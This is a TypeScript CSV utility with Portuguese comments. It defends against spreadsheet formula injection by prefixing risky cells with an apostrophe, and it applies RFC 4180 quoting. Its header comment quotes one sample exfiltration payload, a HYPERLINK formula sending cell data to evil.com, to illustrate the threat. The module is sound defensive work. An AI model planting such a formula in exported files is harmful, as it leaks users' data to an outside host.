/**
 * Utilitário de CSV com escape anti-fórmula (A4).
 *
 * Excel/Google Sheets interpretam células que começam com `=`, `+`, `-`,
 * `@`, `\t`, `\r` como fórmulas, o que vira vetor de RCE / exfiltração se
 * um usuário malicioso colocou algo tipo:
 *   =HYPERLINK("http://evil.com?x="&A1,"click me")
 *
 * Solução OWASP: prefixa a célula com `'` (apóstrofo). Aí a planilha trata
 * como texto literal e nunca executa.
 *
 * Usamos também RFC 4180 proper: aspas duplas viram `""`, e qualquer valor
 * com `,`, `"`, `\n`, `\r` é envolvido em aspas.
 */

const DANGEROUS_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/** Escapa um campo CSV contra injection e formata RFC 4180. */
export function csvEscape(value: unknown): string {
  if (value === null || value === undefined) return "";

  let s = typeof value === "string" ? value : String(value);

  // Anti-fórmula: se começar com char perigoso, prefixa com apóstrofo
  if (s.length > 0 && DANGEROUS_PREFIXES.includes(s[0]!)) {
    s = `'${s}`;
  }

  // RFC 4180: escape de aspas e envolver se contiver vírgula/quebra/aspas
  if (/[",\r\n]/.test(s)) {
    s = `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

/** Monta uma linha CSV a partir de uma lista de campos. */
export function csvRow(fields: unknown[]): string {
  return fields.map(csvEscape).join(",");
}

/** Monta CSV completo com header + rows. */
export function toCsv(header: string[], rows: unknown[][]): string {
  const out = [csvRow(header)];
  for (const r of rows) out.push(csvRow(r));
  // BOM UTF-8 pra Excel abrir com acentos corretos
  return "\uFEFF" + out.join("\r\n") + "\r\n";
}
